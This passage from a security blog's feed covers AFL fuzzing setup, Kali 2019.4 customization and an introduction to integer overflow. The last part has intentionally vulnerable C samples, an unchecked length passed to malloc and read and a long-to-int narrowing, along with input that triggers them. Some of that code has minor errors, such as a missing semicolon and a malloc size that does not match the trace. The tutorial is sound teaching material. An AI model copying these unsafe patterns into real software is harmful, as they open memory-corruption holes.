<p>To load shared lib instrumented by AFL, complie statically </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./configure --disable-shared CC=<span class="string">&quot;afl-gcc&quot;</span> CXX=<span class="string">&quot;afl-g++&quot;</span>` </span><br></pre></td></tr></table></figure>
<h4 id="LLVM-Mode"><a href="#LLVM-Mode" class="headerlink" title="LLVM Mode"></a>LLVM Mode</h4><p>Under LLVM mode, you’ll obtain higher speed of fuzzing.<br>Not the newest but lower version (like 3.x.x) of clang and llvm are needed</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> llvm_mode</span><br><span class="line">$ apt-get install clang</span><br><span class="line">$ <span class="built_in">export</span> LLVM_CONFIG=`<span class="built_in">which</span> llvm-config` &amp;&amp; make &amp;&amp; <span class="built_in">cd</span> ..</span><br></pre></td></tr></table></figure>
<p>Then use</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./configure --disable-shared CC=<span class="string">&quot;afl-clang-fast&quot;</span> CXX=<span class="string">&quot;afl-clang-fast++&quot;</span> </span><br></pre></td></tr></table></figure>

<h3 id="Start-Fuzzing"><a href="#Start-Fuzzing" class="headerlink" title="Start Fuzzing"></a>Start Fuzzing</h3><h4 id="Fuzzing-Mode"><a href="#Fuzzing-Mode" class="headerlink" title="Fuzzing Mode"></a>Fuzzing Mode</h4><p>Generally <code>afl-fuzz</code> provides 4 fuzzing modes that differ in how the program execution between different fuzzing inputs behaves:</p>
<ul>
<li><code>Dumb mode</code> that just executes the program by doing <code>fork()</code> and <code>execv()</code>. This is the slowest mode that does not rely on any fancy tricks to speed up program execution and also does not provide any insights how the program behaves with different inputs.</li>
<li>Basic <a href="http://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html"><code>fork server mode</code></a> where the fuzzed binary does all the initialization steps that happen before calling the <code>main()</code> function and then program is repeatedly forked from that point on. This also includes instrumentation that is compiled in to the program so there already is some insight on what is happening inside the program when a specific input is processed. There exists <code>QEMU</code> mode for <code>afl-fuzz</code> that technically enables fork server mode for uninstrumented binaries, but with some performance penalty.</li>
<li><a href="https://github.com/mirrorer/afl/tree/master/llvm_mode"><code>Deferred instrumentation</code></a> that works in similar fashion as the basic fork server mode. Instead forking just before calling <code>main()</code> function, this enables to move the fork point further down the line and enables heavy program initialization steps to be avoided if they can be executed independently of the input.</li>
<li><a href="https://lcamtuf.blogspot.fi/2015/06/new-in-afl-persistent-mode.html"><code>Persistent mode</code></a> where the fuzzable part of the program is repeatedly executed without resetting the program memory every time the program is called. This only works in practice if the program does not have a modifiable global state that can not be reset to the previous state.</li>
</ul>
<p><code>afl-fuzz</code> generates new inputs and analyzes the program execution results roughly at the same speed regardless of the mode. So these modes are in the order of efficiency in a sense that how much overhead there is for fuzzing one input. They are also in the order of complexity on how easy they are to integrate into an existing program that has not been made to be fuzzed. Especially as the fastest modes require <code>clang</code> to be available as a compiler and the fuzzable program needs to be able to be compiled and linked with it.</p>
<h4 id="White-Box-Testing"><a href="#White-Box-Testing" class="headerlink" title="White Box Testing"></a>White Box Testing</h4><p>(1) Test instrumented program</p>
<p>After compilation, use <code>afl-showmap</code> to run a test ( track execution path ) and see whether instrumentation is useful.</p>
<p>It prints output and captured tuples, which is for getting branch information </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ afl-showmap -o output_dir /path/to/tested/program [params] </span><br><span class="line"></span><br><span class="line"><span class="comment"># example</span></span><br><span class="line"></span><br><span class="line">$ afl-showmap -m none -o /dev/null -- ./build/bin/imagew 23.bmp out.png</span><br><span class="line">[*] Executing <span class="string">&#x27;./build/bin/imagew&#x27;</span>...</span><br><span class="line">-- Program output begins --</span><br><span class="line">23.bmp -&gt; out.png</span><br><span class="line">Processing: 13x32</span><br><span class="line">-- Program output ends --</span><br><span class="line">[+] Captured 1012 tuples <span class="keyword">in</span> <span class="string">&#x27;/dev/null&#x27;</span>.</span><br><span class="line"><span class="comment"># &#x27;-m&#x27; to set cache memory</span></span><br><span class="line"><span class="comment"># &#x27;-o&#x27; to set output directory</span></span><br><span class="line"></span><br><span class="line">$ afl-showmap -m none -o /dev/null -- ./build/bin/imagew 111.pgm out.png</span><br><span class="line">[*] Executing <span class="string">&#x27;./build/bin/imagew&#x27;</span>...</span><br><span class="line">-- Program output begins --</span><br><span class="line">111.pgm -&gt; out.png</span><br><span class="line">Processing: 7x7</span><br><span class="line">-- Program output ends --</span><br><span class="line">[+] Captured 970 tuples <span class="keyword">in</span> <span class="string">&#x27;/dev/null&#x27;</span>.</span><br><span class="line"><span class="comment"># different input gets different tuples</span></span><br></pre></td></tr></table></figure>

<p>(2) Run fuzzer</p>
<p>We have mentioned before:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ afl-fuzz -i testcase_dir -o findings_dir /path/to/program [params]</span><br><span class="line"><span class="comment">#or</span></span><br><span class="line">$ afl-fuzz -i testcase_dir -o findings_dir /path/to/program [params] @@</span><br></pre></td></tr></table></figure>

<p>(3) Use screen</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ screen -S fuzzer1</span><br><span class="line"><span class="comment"># start a new screen</span></span><br><span class="line">$ afl-fuzz -i testcase_dir -o findings_dir /path/to/program [params] @@</span><br><span class="line"><span class="comment"># run fuzzer and use ctrl+d to detach</span></span><br><span class="line">$ screen -ls</span><br><span class="line"><span class="comment"># list screen </span></span><br><span class="line">$ screen -r fuzzer1</span><br><span class="line"><span class="comment"># recovery screen</span></span><br><span class="line"><span class="comment"># if cannot recovery [attached] screen</span></span><br><span class="line"><span class="comment"># add &#x27;-D&#x27; parameter to kick former user</span></span><br></pre></td></tr></table></figure>

<h4 id="Black-Box-Testing"><a href="#Black-Box-Testing" class="headerlink" title="Black Box Testing"></a>Black Box Testing</h4><p>Without source code, instrumentation won’t be finished.</p>
<p>It’s time for QEMU mode, which you should compile first as LLVM mode does.</p>
<p>Nevertheless, AFL’s QEMU version is also old enough, so follow the lead please</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ apt-get install libini-config-dev libtool-bin automake bison libglib2.0-dev -y</span><br><span class="line">$ <span class="built_in">cd</span> qemu_mode</span><br><span class="line">$ build_qemu_support.sh</span><br><span class="line">$ <span class="built_in">cd</span> .. &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<p>Start QEMU mode fuzzing</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ afl-fuzz -Q -i testcase_dir -o findings_dir /path/to/program [params] @@</span><br><span class="line"><span class="comment"># &#x27;-Q&#x27; means QEMU mode</span></span><br></pre></td></tr></table></figure>

<h4 id="Parallel-Testing"><a href="#Parallel-Testing" class="headerlink" title="Parallel Testing"></a>Parallel Testing</h4><p>(1) Sole-system parallel testing</p>
<p>In theory, you can run fuzzing instance according to your computer’s core number, since one one instance is bound to one corresponding core.<br>Check core number in this way:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ cat /proc/cpuinfo| grep <span class="string">&quot;cpu cores&quot;</span>| uniq</span><br></pre></td></tr></table></figure>

<p>Use afl-fuzz to do parallel fuzzing, you have to use <code>-M</code> parameter to assign a <code>Master Fuzzer</code>, use <code>-S</code> to assign multiple <code>Slave Fuzzer</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ screen afl-fuzz -i testcases/ -o sync_dir/ -M fuzzer1 -- ./program</span><br><span class="line">$ screen afl-fuzz -i testcases/ -o sync_dir/ -S fuzzer2 -- ./program</span><br><span class="line">$ screen afl-fuzz -i testcases/ -o sync_dir/ -S fuzzer3 -- ./program</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>

<p>These two kinds have different fuzzing strategies.<br><code>Master Fuzzer</code> does deterministic testing – special rather than random mutations are performed on input files.<br><code>Slave Fuzzer</code> performs completely random mutations.</p>
<p><code>afl-gotcpu</code> helps checking status of every core.</p>
<p><img src="/imghost/afi/2.jpg" alt="afl-gotcpu e.g."></p>
<p>(2) Multi-system parallel testing</p>
<p>I Bet I’ll Hardly Use This. See You Next Time.</p>
]]></content>
      <categories>
        <category>Fuzzing</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>fuzzing</tag>
        <tag>afl</tag>
      </tags>
  </entry>
  <entry>
    <title>Customize New Featured Kali 2019.4</title>
    <url>/2019/12/30/2019-12-30-Customize-New-Featured-Kali-2019-4/</url>
    <content><![CDATA[<p>Since Kali has a new release with a lot of changes, a note for figuring problems and personal customizing is needed.</p>
<h2 id="New-Features-of-Kali-2019-4"><a href="#New-Features-of-Kali-2019-4" class="headerlink" title="New Features of Kali 2019.4"></a>New Features of Kali 2019.4</h2><p><a class="link"   href="https://www.kali.org/news/kali-linux-2019-4-release/" >Kali Linux 2019.4 Release<i class="fas fa-external-link-alt"></i></a></p>
<p>2019.4 includes some exciting new updates:</p>
<ul>
<li>A new default desktop environment, Xfce</li>
<li>New GTK3 theme (for Gnome and Xfce)</li>
<li>Introduction of “Kali Undercover” mode</li>
<li>Kali Documentation has a new home and is now Git powered</li>
<li>Public Packaging – getting your tools into Kali</li>
<li>Kali NetHunter KeX – Full Kali desktop on Android</li>
<li>BTRFS during setup</li>
<li>Added PowerShell</li>
<li>The kernel is upgraded to version 5.3.9</li>
</ul>
<p>… Plus the normal bugs fixes and updates.</p>
<h2 id="Problems-With-Chinese"><a href="#Problems-With-Chinese" class="headerlink" title="Problems With Chinese"></a>Problems With Chinese</h2><p>After First Installation, You will see errors when displaying chinese characters.<br>I’m here to tell the solution.</p>
<h3 id="Choose-Language"><a href="#Choose-Language" class="headerlink" title="Choose Language"></a>Choose Language</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ apt install locales</span><br><span class="line"></span><br><span class="line">$ dpkg-reconfigure locales # choose zh_CN GB2312 zh_CN.GBK GBK ;zh_CN.UTF-8 UTF-8  ; en_US.UTF8 (or whatever u want)</span><br><span class="line"></span><br><span class="line">$ vim /etc/default/locale # set LANG=en_US.UTF-8</span><br></pre></td></tr></table></figure>
<h3 id="Install-Fonts"><a href="#Install-Fonts" class="headerlink" title="Install Fonts"></a>Install Fonts</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ apt-get update  </span><br><span class="line">$ apt-get upgrade -y </span><br><span class="line">$ apt-get dist-upgrade -y  </span><br><span class="line"></span><br><span class="line">$ apt-get install xfonts-intl-chinese -y  # get language support</span><br><span class="line"></span><br><span class="line">$ apt-get install ttf-wqy-microhei -y # install right font</span><br><span class="line">reboot # make it effective  </span><br></pre></td></tr></table></figure>
<h2 id="Time-Display-Error"><a href="#Time-Display-Error" class="headerlink" title="Time Display Error"></a>Time Display Error</h2><p>Dual system users may meet question that Windows and Linux have different time.<br>It’s easy to change or correct time on Windows 10. On Linux you can refer to <a class="link"   href="https://www.cnblogs.com/aguncn/p/4316093.html" >this<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="https://blog.csdn.net/qq_36737934/article/details/90233406" >this<i class="fas fa-external-link-alt"></i></a>.<br>To be brief, install ntp server (yum, dnf or apt) and run this command: <code>ntpdate cn.pool.ntp.org</code>, then you will get time right (only for those living in China).</p>
<h2 id="Change-Repo-Source-Edit-Source-List"><a href="#Change-Repo-Source-Edit-Source-List" class="headerlink" title="Change Repo Source (Edit Source List)"></a>Change Repo Source (Edit Source List)</h2><h3 id="Change-Kali-Source"><a href="#Change-Kali-Source" class="headerlink" title="Change Kali Source"></a>Change Kali Source</h3><p>Also suitable for Ubuntu users adding kali to source.list</p>
<h4 id="Recommend-Sources"><a href="#Recommend-Sources" class="headerlink" title="Recommend Sources"></a>Recommend Sources</h4><p>aliyun kali source:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>
<p>ustc kali source:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib  </span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib </span><br></pre></td></tr></table></figure>
<p>tuna kali source</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure>
<h4 id="Add-Pub-Key"><a href="#Add-Pub-Key" class="headerlink" title="Add Pub Key"></a>Add Pub Key</h4><p>Deal with public key error.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-key adv --keyserver keyserver.ubuntu.com --recv 7D8D0BF6</span><br></pre></td></tr></table></figure>
<p>or</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ wget archive.kali.org/archive-key.asc</span><br><span class="line">$ apt-key add archive-key.asc</span><br></pre></td></tr></table></figure>
<h3 id="Add-Deepin-Source"><a href="#Add-Deepin-Source" class="headerlink" title="Add Deepin Source"></a>Add Deepin Source</h3><p>Create a new file like <code>/etc/apt/sources.list.d/deepin-ubuntu-dde-bionic.list</code>, then write deepin source in it.</p>
<h4 id="Recommend-Sources-1"><a href="#Recommend-Sources-1" class="headerlink" title="Recommend Sources"></a>Recommend Sources</h4><p>official deepin source:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb [by-hash=force] http://packages.deepin.com/deepin stable main contrib non-free</span><br><span class="line">#deb-src http://packages.deepin.com/deepin stable main contrib non-free</span><br></pre></td></tr></table></figure>
<p>aliyun deepin source:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb https://mirrors.aliyun.com/deepin/ panda main contrib non-free</span><br><span class="line">deb-src https://mirrors.aliyun.com/deepin/ panda main contrib non-free</span><br></pre></td></tr></table></figure>
<h4 id="Add-Pub-Key-1"><a href="#Add-Pub-Key-1" class="headerlink" title="Add Pub Key"></a>Add Pub Key</h4><p>Deal with public key error.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ wget https://mirrors.aliyun.com/deepin/project/deepin-keyring.gpg</span><br><span class="line">$ gpg --import deepin-keyring.gpg</span><br><span class="line">$ sudo gpg --export --armor 209088E7 | sudo apt-key add -</span><br><span class="line">$ sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 425956BB3E31DF51</span><br></pre></td></tr></table></figure>
<p>You can update after that. </p>
<h4 id="Don’t-Upgrade-Just-Install"><a href="#Don’t-Upgrade-Just-Install" class="headerlink" title="Don’t Upgrade, Just Install"></a>Don’t Upgrade, Just Install</h4><p>Install most featured deepin-wine, and deepin-wine apps (qq &amp; wechat cannot function due to old version)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ apt install deepin-wine</span><br><span class="line"></span><br><span class="line">$ apt install deepin.xxx</span><br><span class="line">deepin.cn.360.yasuo                  deepin.com.qq.office</span><br><span class="line">deepin.cn.com.winrar                 deepin.com.qq.rtx2015</span><br><span class="line">deepin.com.95579.cjsc                deepin.com.taobao.aliclient.qianniu</span><br><span class="line">deepin.com.aaa-logo                  deepin.com.taobao.wangwang</span><br><span class="line">deepin.com.baidu.pan                 deepin.com.thunderspeed</span><br><span class="line">deepin.com.cmbchina                  deepin.com.wechat</span><br><span class="line">deepin.com.foxmail                   deepin.com.wechat.devtools</span><br><span class="line">deepin.com.gtja.fuyi                 deepin.com.weixin.work</span><br><span class="line">deepin.com.qq.b.crm                  deepin.net.cnki.cajviewer</span><br><span class="line">deepin.com.qq.b.eim                  deepin.org.7-zip</span><br><span class="line">deepin.com.qq.im                     deepin.org.foobar2000</span><br><span class="line">deepin.com.qq.im.light               </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="New-Undercover-Mode"><a href="#New-Undercover-Mode" class="headerlink" title="New Undercover Mode"></a>New Undercover Mode</h2><h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>Use a script to switch to the theme like windows 10. Same way to switch back.</p>
<p><img src="/imghost/cnfk/1.gif" alt="kali undercover mode"></p>
<h3 id="More-Customization"><a href="#More-Customization" class="headerlink" title="More Customization"></a>More Customization</h3><p>Use own pic to hide dragon symbol or customize your background-pic </p>
<h4 id="Grub-Background"><a href="#Grub-Background" class="headerlink" title="Grub Background"></a>Grub Background</h4><p><a class="link"   href="https://linux.cn/article-8359-1.html" >Reference for old editions<i class="fas fa-external-link-alt"></i></a><br>use update-grub to see</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$  update-grub</span><br><span class="line">Generating grub configuration file ...</span><br><span class="line">Found theme: /boot/grub/themes/kali/theme.txt</span><br><span class="line">Found background image: /usr/share/images/desktop-base/desktop-grub.png</span><br><span class="line">Found linux image: /boot/vmlinuz-5.3.0-kali3-amd64</span><br><span class="line">Found initrd image: /boot/initrd.img-5.3.0-kali3-amd64</span><br><span class="line">Found linux image: /boot/vmlinuz-5.3.0-kali2-amd64</span><br><span class="line">Found initrd image: /boot/initrd.img-5.3.0-kali2-amd64</span><br><span class="line">Adding boot menu entry for EFI firmware configuration</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<p>Kali Linux 2019.4 is xfce desktop environment, so the output is different from former editions. </p>
<p>Here you can see <code>/usr/share/images/desktop-base/desktop-grub.png</code> is the default pic for background. It is set by <code>/boot/grub/themes/kali/grub_background.sh</code> But this background is no grub background, is the pic shows after you do grub choice.</p>
<p>As for the grub background, the default pic path is <code>/boot/grub/themes/kali/grub-16x9.png</code></p>
<p>check <code>/boot/grub/themes/kali/theme.txt</code> to do more.</p>
<h4 id="Login-Background"><a href="#Login-Background" class="headerlink" title="Login Background"></a>Login Background</h4><p>After setting the grub background, we can then change login background to get more customization<br>The path is <code>/usr/share/backgrounds/kali/kali-light-16x9.png</code></p>
<p>check <code>/etc/lightdm/lightdm-gtk-greeter.conf</code> and you will see why.</p>
<h4 id="Undercover-Mode-Background"><a href="#Undercover-Mode-Background" class="headerlink" title="Undercover Mode Background"></a>Undercover Mode Background</h4><p>The path of default background is <code>/usr/share/kali-undercover/backgrounds/Windows-10.jpg</code>, and if you change it, immediately desktop image will change.<br>The path of config file remains to be seen…</p>
<h3 id="Last"><a href="#Last" class="headerlink" title="Last"></a>Last</h3><p>All the above paths can be found if you keep searching, and different PC or distributions may have different results, so don’t forget to do your own customization.</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>note</tag>
        <tag>linux</tag>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>Integer Overflow Intro</title>
    <url>/2020/07/16/2020-07-16-Integer-Overflow-Intro/</url>
    <content><![CDATA[<p>Here we experiment integer overflow on <code>Linux</code>.</p>
<h2 id="Integer-Overflow-Introduction"><a href="#Integer-Overflow-Introduction" class="headerlink" title="Integer Overflow Introduction"></a>Integer Overflow Introduction</h2><p>In C language, the basic data types of integers are divided into short (short), integer (int), and long (long). These three data types are also divided into signed and unsigned, each data type. They all have their own size ranges (because the size range of the data type is determined by the compiler, so the default is to use gcc-5.4 under 64 bits), as shown below:</p>
<table>
<thead>
<tr>
<th align="center">Type</th>
<th align="center">Byte</th>
<th align="center">Range</th>
</tr>
</thead>
<tbody><tr>
<td align="center">short int</td>
<td align="center">2byte(word)</td>
<td align="center">0~32767(0~0x7fff) <br> -32768~-1(0x8000~0xffff)</td>
</tr>
<tr>
<td align="center">unsigned short int</td>
<td align="center">2byte(word)</td>
<td align="center">0~65535(0~0xffff)</td>
</tr>
<tr>
<td align="center">int</td>
<td align="center">4byte(dword)</td>
<td align="center">0~2147483647(0~0x7fffffff) <br> -2147483648~-1(0x80000000~0xffffffff)</td>
</tr>
<tr>
<td align="center">unsigned int</td>
<td align="center">4byte(dword)</td>
<td align="center">0~4294967295(0~0xffffffff)</td>
</tr>
<tr>
<td align="center">long int</td>
<td align="center">8byte(qword)</td>
<td align="center">Positive: 0~0x7fffffffffffffff <br> Negative: 0x8000000000000000~0xffffffffffffffff</td>
</tr>
<tr>
<td align="center">unsigned long int</td>
<td align="center">8byte(qword)</td>
<td align="center">0~0xffffffffffffffff</td>
</tr>
</tbody></table>
<p>When the data in the program exceeds the range of its data type, it will cause an overflow, and the overflow of the integer type is called integer overflow.</p>
<h2 id="Principle"><a href="#Principle" class="headerlink" title="Principle"></a>Principle</h2><p>Here briefly explains the principle of integer overflow.</p>
<h3 id="Upper-Bound-Overflow"><a href="#Upper-Bound-Overflow" class="headerlink" title="Upper Bound Overflow"></a>Upper Bound Overflow</h3><p>There are two cases of upper bound overflow, <code>0x7fff + 1</code> and <code>0xffff + 1</code>.</p>
<p>That is because the low-level instructions of the computer are not distinguishable between signed and unsigned, and all data is stored in binary (in compiler level, it distinguishes between signed and unsigned, and produces different assembly instructions).</p>
<p>So <code>add 0x7fff, 1 == 0x8000</code>, this kind of upper bound overflow has no effect on unsigned integers, but in signed short integers, <code>0x7fff</code> means <code>32767</code>, but <code>0x8000</code> It is <code>-32768</code>, which is represented by a mathematical expression in the signed short integer <code>32767+1 == -32768</code>.</p>
<p>The second case is <code>add 0xffff, 1</code>. In this case, the first operand is to be considered.</p>
<p>For example, the assembly code for the signed addition above is <code>add eax, 1</code>, because <code>eax=0xffff</code>, so <code>add eax, 1 == 0x10000</code>, but the unsigned assembly code is to do <code>add Word ptr [rbp - 0x1a], 1 == 0x0000</code>.</p>
<p>In the signed addition, although the result of <code>eax</code> is <code>0x10000</code>, only the value of <code>ax=0x0000</code> is stored in the memory, and the result is the same as the unsigned.</p>
<p>In the signed short integer, <code>0xffff==-1, -1 + 1 == 0</code>, this calculation is no problem from a signed one. In an unsigned short, <code>0xffff == 65535, 65535 + 1 == 0</code>.</p>
<p>assembly instructions of signed and unsigned addition:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta"># pseudocode</span></span><br><span class="line"><span class="keyword">short</span> <span class="keyword">int</span> a;</span><br><span class="line">a = a + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta"># corresponding assembly</span></span><br><span class="line">movzx eax, word ptr [rbp - <span class="number">0x1c</span>]</span><br><span class="line">add    eax, <span class="number">1</span></span><br><span class="line">mov word ptr [rbp - <span class="number">0x1c</span>], ax</span><br><span class="line"></span><br><span class="line"><span class="meta"># and </span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> b;</span><br><span class="line">b = b + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta"># assembly code</span></span><br><span class="line">add    word ptr [rbp - <span class="number">0x1a</span>], <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h3 id="Lower-Bound-Overflow"><a href="#Lower-Bound-Overflow" class="headerlink" title="Lower Bound Overflow"></a>Lower Bound Overflow</h3><p>Lower bound overflow is similar to the upper bound overflow. In the assembly, just need to replace <code>add</code> with <code>sub</code>.</p>
<p>There are two cases as well:</p>
<p>The first case  is <code>sub 0x0000, 1 == 0xffff</code>, which is ok for signed <code>0 - 1 == -1</code>, but for unsigned it becomes <code>0 - 1 == 65535</code>.</p>
<p>The second case is <code>sub 0x8000, 1 == 0x7fff</code>, for unsigned it is <code>32768 - 1 == 32767</code> is correct, but for signed it becomes <code>-32768 - 1 == 32767</code> .</p>
<h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>It can be summarized in two cases.</p>
<h3 id="Unrestricted-Range"><a href="#Unrestricted-Range" class="headerlink" title="Unrestricted Range"></a>Unrestricted Range</h3><p>This situation is easy to understand. A thing of a fixed size, if not constrained well, will cause unpredictable consequences.</p>
<p>Here we write a sample <code>intof.c</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">int</span> data_len;</span><br><span class="line">    <span class="keyword">int</span> header_len;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line"></span><br><span class="line">    header_len = <span class="number">0x10</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%uld&quot;</span>, &amp;data_len);</span><br><span class="line"></span><br><span class="line">    len = data_len+header_len</span><br><span class="line">    buf = <span class="built_in">malloc</span>(len);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, buf, data_len);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Compile and run it:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ gcc -o intof intof.c</span><br><span class="line">intof.c: In <span class="keyword">function</span> ‘main’:</span><br><span class="line">intof.c:17:2: warning: implicit declaration of <span class="keyword">function</span> ‘<span class="built_in">read</span>’; did you mean ‘fread’? [-Wimplicit-function-declaration]</span><br><span class="line">   17 |  <span class="built_in">read</span>(0, buf, data_len);</span><br><span class="line">      |  ^~~~</span><br><span class="line">      |  fread</span><br><span class="line">$ ./intof</span><br><span class="line">3                           <span class="comment"># input len</span></span><br><span class="line">abcdefg                     <span class="comment"># input string</span></span><br><span class="line">$ defg</span><br><span class="line">-bash: defg: <span class="built_in">command</span> not found</span><br><span class="line"><span class="comment"># it only reads 3 chars</span></span><br><span class="line">$</span><br><span class="line">$ ./intof</span><br><span class="line">-1                          <span class="comment"># input len</span></span><br><span class="line">qwertyuiopasdfghjklzxcvbnm  <span class="comment"># input string</span></span><br><span class="line"><span class="comment"># it reads all chars</span></span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<p>What happened? We use <code>gdb</code> to see.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ gdb intof -q</span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> `gef` to start, `gef config` to configure</span><br><span class="line">88 commands loaded <span class="keyword">for</span> GDB 9.2 using Python engine 3.8</span><br><span class="line">Reading symbols from intof...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> intof)</span><br><span class="line">gef➤  b malloc</span><br><span class="line">Breakpoint 1 at 0x1040</span><br><span class="line">gef➤r</span><br><span class="line">...</span><br><span class="line">gef➤c</span><br><span class="line">Continuing.</span><br><span class="line">-1                          <span class="comment"># input data length</span></span><br><span class="line">qwertyuiopasdfghjklzxcvbnm  <span class="comment"># string to read</span></span><br><span class="line">...</span><br><span class="line">─────────────────── trace ────</span><br><span class="line">[<span class="comment">#0] 0x7ffff7e89a40 → __GI___libc_malloc(bytes=0xf)     </span></span><br><span class="line">[<span class="comment">#1] 0x555555555194 → main()</span></span><br><span class="line">──────────────────────────────</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure>
<p>We input <code>-1</code> to apply, only to apply <code>0x20</code> size heap, while we can input a string of <code>0xffffffff</code> size. (from integer overflow to heap overflow)</p>
<h3 id="Wrong-Type-Conversion"><a href="#Wrong-Type-Conversion" class="headerlink" title="Wrong Type Conversion"></a>Wrong Type Conversion</h3><p>Even if the correct constraints on the variables, there is still the possibility of integer overflow vulnerabilities, I think it can be summarized as the wrong type conversion, if you continue to subdivide, it can be divided into:</p>
<ol>
<li>A large range variable is assigned to a small range variable.</li>
</ol>
<p>Example <code>intof2.c</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!n)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;vuln&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> a;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>, &amp;a);</span><br><span class="line">    <span class="keyword">if</span> (a == <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Bad&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">check</span>(a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Compile it and run:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ gcc -o intof2 intof2.c</span><br><span class="line">$ ./intof2</span><br><span class="line">4294967296</span><br><span class="line">vuln</span><br></pre></td></tr></table></figure>
<p>The above is to copy a large variable (long integer a) to a variable with a small range (integer variable n) and causing an integer overflow.</p>
